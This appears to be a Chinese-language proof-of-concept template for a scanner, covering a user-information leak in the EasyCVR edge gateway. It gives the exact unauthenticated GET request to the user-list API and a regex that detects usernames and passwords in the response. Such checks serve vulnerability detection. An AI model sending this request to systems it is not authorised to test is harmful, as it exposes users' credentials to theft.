﻿# EasyCVR智能边缘网关用户信息泄漏漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /api/v1/userlist?pageindex=0&pagesize=10 HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?Username)(?=.*?Password).*?$

> 上传文件定位：

> 验证文件来源：EasyCVR智能边缘网关用户信息泄漏漏洞.poc
